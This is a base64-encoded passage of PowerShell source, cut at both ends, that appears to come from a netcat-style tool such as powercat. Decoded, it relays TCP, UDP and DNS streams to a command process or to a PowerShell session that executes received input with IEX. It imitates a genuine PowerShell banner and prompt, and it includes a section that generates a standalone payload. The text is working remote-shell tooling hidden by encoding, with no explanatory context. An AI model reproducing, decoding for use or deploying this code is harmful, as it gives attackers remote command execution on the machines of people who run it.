CiAgICAgIGlmKCRTdGRPdXRCeXRlc1JlYWQgLWVxIDApe2JyZWFrfQ0KICAgICAgJERhdGEgKz0gJEZ1bmNWYXJzWyJTdGRPdXREZXN0aW5hdGlvbkJ1ZmZlciJdWzAuLihbaW50XSRTdGRPdXRCeXRlc1JlYWQtMSldDQogICAgICAkRnVuY1ZhcnNbIlN0ZE91dFJlYWRPcGVyYXRpb24iXSA9ICRGdW5jVmFyc1siUHJvY2VzcyJdLlN0YW5kYXJkT3V0cHV0LkJhc2VTdHJlYW0uQmVnaW5SZWFkKCRGdW5jVmFyc1siU3RkT3V0RGVzdGluYXRpb25CdWZmZXIiXSwgMCwgNjU1MzYsICRudWxsLCAkbnVsbCkNCiAgICB9DQogICAgaWYoJEZ1bmNWYXJzWyJTdGRFcnJSZWFkT3BlcmF0aW9uIl0uSXNDb21wbGV0ZWQpDQogICAgew0KICAgICAgJFN0ZEVyckJ5dGVzUmVhZCA9ICRGdW5jVmFyc1siUHJvY2VzcyJdLlN0YW5kYXJkRXJyb3IuQmFzZVN0cmVhbS5FbmRSZWFkKCRGdW5jVmFyc1siU3RkRXJyUmVhZE9wZXJhdGlvbiJdKQ0KICAgICAgaWYoJFN0ZEVyckJ5dGVzUmVhZCAtZXEgMCl7YnJlYWt9DQogICAgICAkRGF0YSArPSAkRnVuY1ZhcnNbIlN0ZEVyckRlc3RpbmF0aW9uQnVmZmVyIl1bMC4uKFtpbnRdJFN0ZEVyckJ5dGVzUmVhZC0xKV0NCiAgICAgICRGdW5jVmFyc1siU3RkRXJyUmVhZE9wZXJhdGlvbiJdID0gJEZ1bmNWYXJzWyJQcm9jZXNzIl0uU3RhbmRhcmRFcnJvci5CYXNlU3RyZWFtLkJlZ2luUmVhZCgkRnVuY1ZhcnNbIlN0ZEVyckRlc3RpbmF0aW9uQnVmZmVyIl0sIDAsIDY1NTM2LCAkbnVsbCwgJG51bGwpDQogICAgfQ0KICAgIHJldHVybiAkRGF0YSwkRnVuY1ZhcnMNCiAgfQ0KICBmdW5jdGlvbiBXcml0ZURhdGFfQ01EDQogIHsNCiAgICBwYXJhbSgkRGF0YSwkRnVuY1ZhcnMpDQogICAgJEZ1bmNWYXJzWyJQcm9jZXNzIl0uU3RhbmRhcmRJbnB1dC5Xcml0ZUxpbmUoJEZ1bmNWYXJzWyJFbmNvZGluZyJdLkdldFN0cmluZygkRGF0YSkuVHJpbUVuZCgiYHIiKS5UcmltRW5kKCJgbiIpKQ0KICAgIHJldHVybiAkRnVuY1ZhcnMNCiAgfQ0KICBmdW5jdGlvbiBDbG9zZV9DTUQNCiAgew0KICAgIHBhcmFtKCRGdW5jVmFycykNCiAgICAkRnVuY1ZhcnNbIlByb2Nlc3MiXSB8IFN0b3AtUHJvY2Vzcw0KICB9ICANCiAgIyMjIyMjIyMjIyBDTUQgRlVOQ1RJT05TICMjIyMjIyMjIyMNCiAgDQogICMjIyMjIyMjIyMgUE9XRVJTSEVMTCBGVU5DVElPTlMgIyMjIyMjIyMjIw0KICBmdW5jdGlvbiBNYWluX1Bvd2Vyc2hlbGwNCiAgew0KICAgIHBhcmFtKCRTdHJlYW0xU2V0dXBWYXJzKSAgIA0KICAgIHRyeQ0KICAgIHsNCiAgICAgICRlbmNvZGluZyA9IE5ldy1PYmplY3QgU3lzdGVtLlRleHQuQXNjaWlFbmNvZGluZw0KICAgICAgW2J5dGVbXV0kSW5wdXRUb1dyaXRlID0gQCgpDQogICAgICBpZigkaSAtbmUgJG51bGwpDQogICAgICB7DQogICAgICAgIFdyaXRlLVZlcmJvc2UgIklucHV0IGZyb20gLWkgZGV0ZWN0ZWQuLi4iDQogICAgICAgIGlmKFRlc3QtUGF0aCAkaSl7IFtieXRlW11dJElucHV0VG9Xcml0ZSA9IChbaW8uZmlsZV06OlJlYWRBbGxCeXRlcygkaSkpIH0NCiAgICAgICAgZWxzZWlmKCRpLkdldFR5cGUoKS5OYW1lIC1lcSAiQnl0ZVtdIil7IFtieXRlW11dJElucHV0VG9Xcml0ZSA9ICRpIH0NCiAgICAgICAgZWxzZWlmKCRpLkdldFR5cGUoKS5OYW1lIC1lcSAiU3RyaW5nIil7IFtieXRlW11dJElucHV0VG9Xcml0ZSA9ICRFbmNvZGluZy5HZXRCeXRlcygkaSkgfQ0KICAgICAgICBlbHNle1dyaXRlLUhvc3QgIlVucmVjb2duaXNlZCBpbnB1dCB0eXBlLiIgOyByZXR1cm59DQogICAgICB9DQogICAgDQogICAgICBXcml0ZS1WZXJib3NlICJTZXR0aW5nIHVwIFN0cmVhbSAxLi4uIChFU0MvQ1RSTCB0byBleGl0KSINCiAgICAgIHRyeXskU3RyZWFtMVZhcnMgPSBTdHJlYW0xX1NldHVwICRTdHJlYW0xU2V0dXBWYXJzfQ0KICAgICAgY2F0Y2h7V3JpdGUtVmVyYm9zZSAiU3RyZWFtIDEgU2V0dXAgRmFpbHVyZSIgOyBicmVha30NCiAgICAgIA0KICAgICAgV3JpdGUtVmVyYm9zZSAiU2V0dGluZyB1cCBTdHJlYW0gMi4uLiAoRVNDL0NUUkwgdG8gZXhpdCkiDQogICAgICB0cnkNCiAgICAgIHsNCiAgICAgICAgJEludHJvUHJvbXB0ID0gJEVuY29kaW5nLkdldEJ5dGVzKCJXaW5kb3dzIFBvd2VyU2hlbGxgbkNvcHlyaWdodCAoQykgMjAxMyBNaWNyb3NvZnQgQ29ycG9yYXRpb24uIEFsbCByaWdodHMgcmVzZXJ2ZWQuYG5gbiIgKyAoIlBTICIgKyAocHdkKS5QYXRoICsgIj4gIikpDQogICAgICAgICRQcm9tcHQgPSAoIlBTICIgKyAocHdkKS5QYXRoICsgIj4gIikNCiAgICAgICAgJENvbW1hbmRUb0V4ZWN1dGUgPSAiIiAgICAgIA0KICAgICAgICAkRGF0YSA9ICRudWxsDQogICAgICB9DQogICAgICBjYXRjaA0KICAgICAgew0KICAgICAgICBXcml0ZS1WZXJib3NlICJTdHJlYW0gMiBTZXR1cCBGYWlsdXJlIiA7IGJyZWFrDQogICAgICB9DQogICAgICANCiAgICAgIGlmKCRJbnB1dFRvV3JpdGUgLW5lIEAoKSkNCiAgICAgIHsNCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiV3JpdGluZyBpbnB1dCB0byBTdHJlYW0gMS4uLiINCiAgICAgICAgdHJ5eyRTdHJlYW0xVmFycyA9IFN0cmVhbTFfV3JpdGVEYXRhICRJbnB1dFRvV3JpdGUgJFN0cmVhbTFWYXJzfQ0KICAgICAgICBjYXRjaHtXcml0ZS1Ib3N0ICJGYWlsZWQgdG8gd3JpdGUgaW5wdXQgdG8gU3RyZWFtIDEiIDsgYnJlYWt9DQogICAgICB9DQogICAgICANCiAgICAgIGlmKCRkKXtXcml0ZS1WZXJib3NlICItZCAoZGlzY29ubmVjdCkgQWN0aXZhdGVkLiBEaXNjb25uZWN0aW5nLi4uIiA7IGJyZWFrfQ0KICAgICAgDQogICAgICBXcml0ZS1WZXJib3NlICJCb3RoIENvbW11bmljYXRpb24gU3RyZWFtcyBFc3RhYmxpc2hlZC4gUmVkaXJlY3RpbmcgRGF0YSBCZXR3ZWVuIFN0cmVhbXMuLi4iDQogICAgICB3aGlsZSgkVHJ1ZSkNCiAgICAgIHsgICAgICAgIA0KICAgICAgICB0cnkNCiAgICAgICAgew0KICAgICAgICAgICMjIyMjIFN0cmVhbTIgUmVhZCAjIyMjIw0KICAgICAgICAgICRQcm9tcHQgPSAkbnVsbA0KICAgICAgICAgICRSZXR1cm5lZERhdGEgPSAkbnVsbA0KICAgICAgICAgIGlmKCRDb21tYW5kVG9FeGVjdXRlIC1uZSAiIikNCiAgICAgICAgICB7DQogICAgICAgICAgICB0cnl7W2J5dGVbXV0kUmV0dXJuZWREYXRhID0gJEVuY29kaW5nLkdldEJ5dGVzKChJRVggJENvbW1hbmRUb0V4ZWN1dGUgMj4mMSB8IE91dC1TdHJpbmcpKX0NCiAgICAgICAgICAgIGNhdGNoe1tieXRlW11dJFJldHVybmVkRGF0YSA9ICRFbmNvZGluZy5HZXRCeXRlcygoJF8gfCBPdXQtU3RyaW5nKSl9DQogICAgICAgICAgICAkUHJvbXB0ID0gJEVuY29kaW5nLkdldEJ5dGVzKCgiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiKSkNCiAgICAgICAgICB9DQogICAgICAgICAgJERhdGEgKz0gJEludHJvUHJvbXB0DQogICAgICAgICAgJEludHJvUHJvbXB0ID0gJG51bGwNCiAgICAgICAgICAkRGF0YSArPSAkUmV0dXJuZWREYXRhDQogICAgICAgICAgJERhdGEgKz0gJFByb21wdA0KICAgICAgICAgICRDb21tYW5kVG9FeGVjdXRlID0gIiINCiAgICAgICAgICAjIyMjIyBTdHJlYW0yIFJlYWQgIyMjIyMNCg0KICAgICAgICAgIGlmKCREYXRhIC1uZSAkbnVsbCl7JFN0cmVhbTFWYXJzID0gU3RyZWFtMV9Xcml0ZURhdGEgJERhdGEgJFN0cmVhbTFWYXJzfQ0KICAgICAgICAgICREYXRhID0gJG51bGwNCiAgICAgICAgfQ0KICAgICAgICBjYXRjaA0KICAgICAgICB7DQogICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRmFpbGVkIHRvIHJlZGlyZWN0IGRhdGEgZnJvbSBTdHJlYW0gMiB0byBTdHJlYW0gMSIgOyBicmVhaw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICB0cnkNCiAgICAgICAgew0KICAgICAgICAgICREYXRhLCRTdHJlYW0xVmFycyA9IFN0cmVhbTFfUmVhZERhdGEgJFN0cmVhbTFWYXJzDQogICAgICAgICAgaWYoJERhdGEgLW5lICRudWxsKXskQ29tbWFuZFRvRXhlY3V0ZSA9ICRFbmNvZGluZy5HZXRTdHJpbmcoJERhdGEpfQ0KICAgICAgICAgICREYXRhID0gJG51bGwNCiAgICAgICAgfQ0KICAgICAgICBjYXRjaA0KICAgICAgICB7DQogICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRmFpbGVkIHRvIHJlZGlyZWN0IGRhdGEgZnJvbSBTdHJlYW0gMSB0byBTdHJlYW0gMiIgOyBicmVhaw0KICAgICAgICB9DQogICAgICB9DQogICAgfQ0KICAgIGZpbmFsbHkNCiAgICB7DQogICAgICB0cnkNCiAgICAgIHsNCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiQ2xvc2luZyBTdHJlYW0gMS4uLiINCiAgICAgICAgU3RyZWFtMV9DbG9zZSAkU3RyZWFtMVZhcnMNCiAgICAgIH0NCiAgICAgIGNhdGNoDQogICAgICB7DQogICAgICAgIFdyaXRlLVZlcmJvc2UgIkZhaWxlZCB0byBjbG9zZSBTdHJlYW0gMSINCiAgICAgIH0NCiAgICB9DQogIH0NCiAgIyMjIyMjIyMjIyBQT1dFUlNIRUxMIEZVTkNUSU9OUyAjIyMjIyMjIyMjDQoNCiAgIyMjIyMjIyMjIyBDT05TT0xFIEZVTkNUSU9OUyAjIyMjIyMjIyMjDQogIGZ1bmN0aW9uIFNldHVwX0NvbnNvbGUNCiAgew0KICAgIHBhcmFtKCRGdW5jU2V0dXBWYXJzKQ0KICAgICRGdW5jVmFycyA9IEB7fQ0KICAgICRGdW5jVmFyc1siRW5jb2RpbmciXSA9IE5ldy1PYmplY3QgU3lzdGVtLlRleHQuQXNjaWlFbmNvZGluZw0KICAgICRGdW5jVmFyc1siT3V0cHV0Il0gPSAkRnVuY1NldHVwVmFyc1swXQ0KICAgICRGdW5jVmFyc1siT3V0cHV0Qnl0ZXMiXSA9IFtieXRlW11dQCgpDQogICAgJEZ1bmNWYXJzWyJPdXRwdXRTdHJpbmciXSA9ICIiDQogICAgcmV0dXJuICRGdW5jVmFycw0KICB9DQogIGZ1bmN0aW9uIFJlYWREYXRhX0NvbnNvbGUNCiAgew0KICAgIHBhcmFtKCRGdW5jVmFycykNCiAgICAkRGF0YSA9ICRudWxsDQogICAgaWYoJEhvc3QuVUkuUmF3VUkuS2V5QXZhaWxhYmxlKQ0KICAgIHsNCiAgICAgICREYXRhID0gJEZ1bmNWYXJzWyJFbmNvZGluZyJdLkdldEJ5dGVzKChSZWFkLUhvc3QpICsgImBuIikNCiAgICB9DQogICAgcmV0dXJuICREYXRhLCRGdW5jVmFycw0KICB9DQogIGZ1bmN0aW9uIFdyaXRlRGF0YV9Db25zb2xlDQogIHsNCiAgICBwYXJhbSgkRGF0YSwkRnVuY1ZhcnMpDQogICAgc3dpdGNoKCRGdW5jVmFyc1siT3V0cHV0Il0pDQogICAgew0KICAgICAgIkhvc3QiIHtXcml0ZS1Ib3N0IC1uICRGdW5jVmFyc1siRW5jb2RpbmciXS5HZXRTdHJpbmcoJERhdGEpfQ0KICAgICAgIlN0cmluZyIgeyRGdW5jVmFyc1siT3V0cHV0U3RyaW5nIl0gKz0gJEZ1bmNWYXJzWyJFbmNvZGluZyJdLkdldFN0cmluZygkRGF0YSl9DQogICAgICAiQnl0ZXMiIHskRnVuY1ZhcnNbIk91dHB1dEJ5dGVzIl0gKz0gJERhdGF9DQogICAgfQ0KICAgIHJldHVybiAkRnVuY1ZhcnMNCiAgfQ0KICBmdW5jdGlvbiBDbG9zZV9Db25zb2xlDQogIHsNCiAgICBwYXJhbSgkRnVuY1ZhcnMpDQogICAgaWYoJEZ1bmNWYXJzWyJPdXRwdXRTdHJpbmciXSAtbmUgIiIpe3JldHVybiAkRnVuY1ZhcnNbIk91dHB1dFN0cmluZyJdfQ0KICAgIGVsc2VpZigkRnVuY1ZhcnNbIk91dHB1dEJ5dGVzIl0gLW5lIEAoKSl7cmV0dXJuICRGdW5jVmFyc1siT3V0cHV0Qnl0ZXMiXX0NCiAgICByZXR1cm4NCiAgfQ0KICAjIyMjIyMjIyMjIENPTlNPTEUgRlVOQ1RJT05TICMjIyMjIyMjIyMNCiAgDQogICMjIyMjIyMjIyMgTUFJTiBGVU5DVElPTiAjIyMjIyMjIyMjDQogIGZ1bmN0aW9uIE1haW4NCiAgew0KICAgIHBhcmFtKCRTdHJlYW0xU2V0dXBWYXJzLCRTdHJlYW0yU2V0dXBWYXJzKQ0KICAgIHRyeQ0KICAgIHsNCiAgICAgIFtieXRlW11dJElucHV0VG9Xcml0ZSA9IEAoKQ0KICAgICAgJEVuY29kaW5nID0gTmV3LU9iamVjdCBTeXN0ZW0uVGV4dC5Bc2NpaUVuY29kaW5nDQogICAgICBpZigkaSAtbmUgJG51bGwpDQogICAgICB7DQogICAgICAgIFdyaXRlLVZlcmJvc2UgIklucHV0IGZyb20gLWkgZGV0ZWN0ZWQuLi4iDQogICAgICAgIGlmKFRlc3QtUGF0aCAkaSl7IFtieXRlW11dJElucHV0VG9Xcml0ZSA9IChbaW8uZmlsZV06OlJlYWRBbGxCeXRlcygkaSkpIH0NCiAgICAgICAgZWxzZWlmKCRpLkdldFR5cGUoKS5OYW1lIC1lcSAiQnl0ZVtdIil7IFtieXRlW11dJElucHV0VG9Xcml0ZSA9ICRpIH0NCiAgICAgICAgZWxzZWlmKCRpLkdldFR5cGUoKS5OYW1lIC1lcSAiU3RyaW5nIil7IFtieXRlW11dJElucHV0VG9Xcml0ZSA9ICRFbmNvZGluZy5HZXRCeXRlcygkaSkgfQ0KICAgICAgICBlbHNle1dyaXRlLUhvc3QgIlVucmVjb2duaXNlZCBpbnB1dCB0eXBlLiIgOyByZXR1cm59DQogICAgICB9DQogICAgICANCiAgICAgIFdyaXRlLVZlcmJvc2UgIlNldHRpbmcgdXAgU3RyZWFtIDEuLi4iDQogICAgICB0cnl7JFN0cmVhbTFWYXJzID0gU3RyZWFtMV9TZXR1cCAkU3RyZWFtMVNldHVwVmFyc30NCiAgICAgIGNhdGNoe1dyaXRlLVZlcmJvc2UgIlN0cmVhbSAxIFNldHVwIEZhaWx1cmUiIDsgYnJlYWt9DQogICAgICANCiAgICAgIFdyaXRlLVZlcmJvc2UgIlNldHRpbmcgdXAgU3RyZWFtIDIuLi4iDQogICAgICB0cnl7JFN0cmVhbTJWYXJzID0gU3RyZWFtMl9TZXR1cCAkU3RyZWFtMlNldHVwVmFyc30NCiAgICAgIGNhdGNoe1dyaXRlLVZlcmJvc2UgIlN0cmVhbSAyIFNldHVwIEZhaWx1cmUiIDsgYnJlYWt9DQogICAgICANCiAgICAgICREYXRhID0gJG51bGwNCiAgICAgIA0KICAgICAgaWYoJElucHV0VG9Xcml0ZSAtbmUgQCgpKQ0KICAgICAgew0KICAgICAgICBXcml0ZS1WZXJib3NlICJXcml0aW5nIGlucHV0IHRvIFN0cmVhbSAxLi4uIg0KICAgICAgICB0cnl7JFN0cmVhbTFWYXJzID0gU3RyZWFtMV9Xcml0ZURhdGEgJElucHV0VG9Xcml0ZSAkU3RyZWFtMVZhcnN9DQogICAgICAgIGNhdGNoe1dyaXRlLUhvc3QgIkZhaWxlZCB0byB3cml0ZSBpbnB1dCB0byBTdHJlYW0gMSIgOyBicmVha30NCiAgICAgIH0NCiAgICAgIA0KICAgICAgaWYoJGQpe1dyaXRlLVZlcmJvc2UgIi1kIChkaXNjb25uZWN0KSBBY3RpdmF0ZWQuIERpc2Nvbm5lY3RpbmcuLi4iIDsgYnJlYWt9DQogICAgICANCiAgICAgIFdyaXRlLVZlcmJvc2UgIkJvdGggQ29tbXVuaWNhdGlvbiBTdHJlYW1zIEVzdGFibGlzaGVkLiBSZWRpcmVjdGluZyBEYXRhIEJldHdlZW4gU3RyZWFtcy4uLiINCiAgICAgIHdoaWxlKCRUcnVlKQ0KICAgICAgew0KICAgICAgICB0cnkNCiAgICAgICAgew0KICAgICAgICAgICREYXRhLCRTdHJlYW0yVmFycyA9IFN0cmVhbTJfUmVhZERhdGEgJFN0cmVhbTJWYXJzDQogICAgICAgICAgaWYoJERhdGEgLW5lICRudWxsKXskU3RyZWFtMVZhcnMgPSBTdHJlYW0xX1dyaXRlRGF0YSAkRGF0YSAkU3RyZWFtMVZhcnN9DQogICAgICAgICAgJERhdGEgPSAkbnVsbA0KICAgICAgICB9DQogICAgICAgIGNhdGNoDQogICAgICAgIHsNCiAgICAgICAgICBXcml0ZS1WZXJib3NlICJGYWlsZWQgdG8gcmVkaXJlY3QgZGF0YSBmcm9tIFN0cmVhbSAyIHRvIFN0cmVhbSAxIiA7IGJyZWFrDQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIHRyeQ0KICAgICAgICB7DQogICAgICAgICAgJERhdGEsJFN0cmVhbTFWYXJzID0gU3RyZWFtMV9SZWFkRGF0YSAkU3RyZWFtMVZhcnMNCiAgICAgICAgICBpZigkRGF0YSAtbmUgJG51bGwpeyRTdHJlYW0yVmFycyA9IFN0cmVhbTJfV3JpdGVEYXRhICREYXRhICRTdHJlYW0yVmFyc30NCiAgICAgICAgICAkRGF0YSA9ICRudWxsDQogICAgICAgIH0NCiAgICAgICAgY2F0Y2gNCiAgICAgICAgew0KICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkZhaWxlZCB0byByZWRpcmVjdCBkYXRhIGZyb20gU3RyZWFtIDEgdG8gU3RyZWFtIDIiIDsgYnJlYWsNCiAgICAgICAgfQ0KICAgICAgfQ0KICAgIH0NCiAgICBmaW5hbGx5DQogICAgew0KICAgICAgdHJ5DQogICAgICB7DQogICAgICAgICNXcml0ZS1WZXJib3NlICJDbG9zaW5nIFN0cmVhbSAyLi4uIg0KICAgICAgICBTdHJlYW0yX0Nsb3NlICRTdHJlYW0yVmFycw0KICAgICAgfQ0KICAgICAgY2F0Y2gNCiAgICAgIHsNCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiRmFpbGVkIHRvIGNsb3NlIFN0cmVhbSAyIg0KICAgICAgfQ0KICAgICAgdHJ5DQogICAgICB7DQogICAgICAgICNXcml0ZS1WZXJib3NlICJDbG9zaW5nIFN0cmVhbSAxLi4uIg0KICAgICAgICBTdHJlYW0xX0Nsb3NlICRTdHJlYW0xVmFycw0KICAgICAgfQ0KICAgICAgY2F0Y2gNCiAgICAgIHsNCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiRmFpbGVkIHRvIGNsb3NlIFN0cmVhbSAxIg0KICAgICAgfQ0KICAgIH0NCiAgfQ0KICAjIyMjIyMjIyMjIE1BSU4gRlVOQ1RJT04gIyMjIyMjIyMjIw0KICANCiAgIyMjIyMjIyMjIyBHRU5FUkFURSBQQVlMT0FEICMjIyMjIyMjIyMNCiAgaWYoJHUpDQogIHsNCiAgICBXcml0ZS1WZXJib3NlICJTZXQgU3RyZWFtIDE6IFVEUCINCiAgICAkRnVuY3Rpb25TdHJpbmcgPSAoImZ1bmN0aW9uIFN0cmVhbTFfU2V0dXBgbntgbiIgKyAke2Z1bmN0aW9uOlNldHVwX1VEUH0gKyAiYG59YG5gbiIpDQogICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMV9SZWFkRGF0YWBue2BuIiArICR7ZnVuY3Rpb246UmVhZERhdGFfVURQfSArICJgbn1gbmBuIikNCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0xX1dyaXRlRGF0YWBue2BuIiArICR7ZnVuY3Rpb246V3JpdGVEYXRhX1VEUH0gKyAiYG59YG5gbiIpDQogICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMV9DbG9zZWBue2BuIiArICR7ZnVuY3Rpb246Q2xvc2VfVURQfSArICJgbn1gbmBuIikgICAgDQogICAgaWYoJGwpeyRJbnZva2VTdHJpbmcgPSAiTWFpbiBAKCcnLGAkVHJ1ZSwnJHAnLCckdCcpICJ9DQogICAgZWxzZXskSW52b2tlU3RyaW5nID0gIk1haW4gQCgnJGMnLGAkRmFsc2UsJyRwJywnJHQnKSAifQ0KICB9DQogIGVsc2VpZigkZG5zIC1uZSAiIikNCiAgew0KICAgIFdyaXRlLVZlcmJvc2UgIlNldCBTdHJlYW0gMTogRE5TIg0KICAgICRGdW5jdGlvblN0cmluZyA9ICgiZnVuY3Rpb24gU3RyZWFtMV9TZXR1cGBue2BuIiArICR7ZnVuY3Rpb246U2V0dXBfRE5TfSArICJgbn1gbmBuIikNCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0xX1JlYWREYXRhYG57YG4iICsgJHtmdW5jdGlvbjpSZWFkRGF0YV9ETlN9ICsgImBufWBuYG4iKQ0KICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTFfV3JpdGVEYXRhYG57YG4iICsgJHtmdW5jdGlvbjpXcml0ZURhdGFfRE5TfSArICJgbn1gbmBuIikNCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0xX0Nsb3NlYG57YG4iICsgJHtmdW5jdGlvbjpDbG9zZV9ETlN9ICsgImBufWBuYG4iKQ0KICAgIGlmKCRsKXtyZXR1cm4gIlRoaXMgZmVhdHVyZSBpcyBub3QgYXZhaWxhYmxlLiJ9DQogICAgZWxzZXskSW52b2tlU3RyaW5nID0gIk1haW4gQCgnJGMnLCckcCcsJyRkbnMnLCRkbnNmdCkgIn0NCiAgfQ0KICBlbHNlDQogIHsNCiAgICBXcml0ZS1WZXJib3NlICJTZXQgU3RyZWFtIDE6IFRDUCINCiAgICAkRnVuY3Rpb25TdHJpbmcgPSAoImZ1bmN0aW9uIFN0cmVhbTFfU2V0dXBgbntgbiIgKyAke2Z1bmN0aW9uOlNldHVwX1RDUH0gKyAiYG59YG5gbiIpDQogICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMV9SZWFkRGF0YWBue2BuIiArICR7ZnVuY3Rpb246UmVhZERhdGFfVENQfSArICJgbn1gbmBuIikNCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0xX1dyaXRlRGF0YWBue2BuIiArICR7ZnVuY3Rpb246V3JpdGVEYXRhX1RDUH0gKyAiYG59YG5gbiIpDQogICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMV9DbG9zZWBue2BuIiArICR7ZnVuY3Rpb246Q2xvc2VfVENQfSArICJgbn1gbmBuIikNCiAgICBpZigkbCl7JEludm9rZVN0cmluZyA9ICJNYWluIEAoJycsYCRUcnVlLCRwLCR0KSAifQ0KICAgIGVsc2V7JEludm9rZVN0cmluZyA9ICJNYWluIEAoJyRjJyxgJEZhbHNlLCRwLCR0KSAifQ0KICB9DQogIA0KICBpZigkZSAtbmUgIiIpDQogIHsNCiAgICBXcml0ZS1WZXJib3NlICJTZXQgU3RyZWFtIDI6IFByb2Nlc3MiDQogICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9TZXR1cGBue2BuIiArICR7ZnVuY3Rpb246U2V0dXBfQ01EfSArICJgbn1gbmBuIikNCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1JlYWREYXRhYG57YG4iICsgJHtmdW5jdGlvbjpSZWFkRGF0YV9DTUR9ICsgImBufWBuYG4iKQ0KICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfV3JpdGVEYXRhYG57YG4iICsgJHtmdW5jdGlvbjpXcml0ZURhdGFfQ01EfSArICJgbn1gbmBuIikNCiAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX0Nsb3NlYG57YG4iICsgJHtmdW5jdGlvbjpDbG9zZV9DTUR9ICsgImBufWBuYG4iKQ0KICAgICRJbnZva2VTdHJpbmcgKz0gIkAoJyRlJylgbmBuIg0KICB9DQogIGVsc2VpZigkZXApDQogIHsNCiAgICBXcml0ZS1WZXJib3NlICJTZXQgU3RyZWFtIDI6IFBvd2Vyc2hlbGwiDQogICAgJEludm9rZVN0cmluZyArPSAiYG5gbiINCiAgfQ0KICBlbHNlaWYoJHIgLW5lICIiKQ0KICB7DQogICAgaWYoJHIuc3BsaXQoIjoiKVswXS5Ub0xvd2VyKCkgLWVxICJ1ZHAiKQ0KICAgIHsNCiAgICAgIFdyaXRlLVZlcmJvc2UgIlNldCBTdHJlYW0gMjogVURQIg0KICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9TZXR1cGBue2BuIiArICR7ZnVuY3Rpb246U2V0dXBfVURQfSArICJgbn1gbmBuIikNCiAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfUmVhZERhdGFgbntgbiIgKyAke2Z1bmN0aW9uOlJlYWREYXRhX1VEUH0gKyAiYG59YG5gbiIpDQogICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1dyaXRlRGF0YWBue2BuIiArICR7ZnVuY3Rpb246V3JpdGVEYXRhX1VEUH0gKyAiYG59YG5gbiIpDQogICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX0Nsb3NlYG57YG4iICsgJHtmdW5jdGlvbjpDbG9zZV9VRFB9ICsgImBufWBuYG4iKSAgICANCiAgICAgIGlmKCRyLnNwbGl0KCI6IikuQ291bnQgLWVxIDIpeyRJbnZva2VTdHJpbmcgKz0gKCJAKCcnLGAkVHJ1ZSwnIiArICRyLnNwbGl0KCI6IilbMV0gKyAiJywnJHQnKSAiKX0NCiAgICAgIGVsc2VpZigkci5zcGxpdCgiOiIpLkNvdW50IC1lcSAzKXskSW52b2tlU3RyaW5nICs9ICgiQCgnIiArICRyLnNwbGl0KCI6IilbMV0gKyAiJyxgJEZhbHNlLCciICsgJHIuc3BsaXQoIjoiKVsyXSArICInLCckdCcpICIpfQ0KICAgICAgZWxzZXtyZXR1cm4gIkJhZCByZWxheSBmb3JtYXQuIn0NCiAgICB9DQogICAgaWYoJHIuc3BsaXQoIjoiKVswXS5Ub0xvd2VyKCkgLWVxICJkbnMiKQ0KICAgIHsNCiAgICAgIFdyaXRlLVZlcmJvc2UgIlNldCBTdHJlYW0gMjogRE5TIg0KICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMl9TZXR1cGBue2BuIiArICR7ZnVuY3Rpb246U2V0dXBfRE5TfSArICJgbn1gbmBuIikNCiAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTJfUmVhZERhdGFgbntgbiIgKyAke2Z1bmN0aW9uOlJlYWREYXRhX0ROU30gKyAiYG59YG5gbiIpDQogICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX1dyaXRlRGF0YWBue2BuIiArICR7ZnVuY3Rpb246V3JpdGVEYXRhX0ROU30gKyAiYG59YG5gbiIpDQogICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0yX0Nsb3NlYG57YG4iICsgJHtmdW5jdGlvbjpDbG9zZV9ETlN9ICsgImBufWBuYG4iKQ0KICAgICAgaWYoJHIuc3BsaXQoIjoiKS5Db3VudCAtZXEgMil7cmV0dXJuICJUaGlzIGZlYXR1cmUgaXMgbm90IGF2YWlsYWJsZS4ifQ0KICAgICAgZWxzZWlmKCRyLnNwbGl0KCI6IikuQ291bnQgLWVxIDQpeyRJbnZva2VTdHJpbmcgKz0gKCJAKCciICsgJHIuc3BsaXQoIjoiKVsxXSArICInLCciICsgJHIuc3BsaXQoIjoiKVsyXSArICInLCciICsgJHIuc3BsaXQoIjoiKVszXSArICInLCRkbnNmdCkgIil9DQogIC